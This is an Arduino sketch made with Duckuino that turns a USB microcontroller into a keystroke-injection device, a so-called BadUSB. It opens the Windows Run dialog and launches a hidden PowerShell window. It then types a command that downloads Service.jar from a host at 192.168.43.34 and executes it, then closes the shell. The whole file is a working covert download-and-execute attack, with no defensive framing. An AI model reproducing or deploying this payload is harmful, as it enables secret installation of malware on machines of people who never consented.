/**
 * Made with Duckuino, an open-source project.
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  // You can remove this Delay line in the beginning (I just rather having it just in case)
  delay(60000);
  // open the Run
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  // Change this value depending on the computer you are using ( i mean slow or not )
  delay(100);
  Keyboard.print(F("powershell -windowstyle hidden"));

  typeKey(KEY_RETURN);

  // the shell usually takes a few  seconds to fully run so i put a delay just in case .
  delay(1000);
  // I just wanted to note that the file can be an EXE or JAR file doesn't really matter.
  // in the destination if you put the fileName only, the file will be saved under C:\Users\LoggedInUser
  Keyboard.print(F("$source = \"http://192.168.43.34/Service.jar\"; $destination = \"Service.jar\"; Invoke-WebRequest $source -OutFile $destination;"));

  typeKey(KEY_RETURN);

  delay(5000);
  Keyboard.print(F("start-process Service.jar"));

  typeKey(KEY_RETURN);

  delay(100);
  Keyboard.print(F("exit"));

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}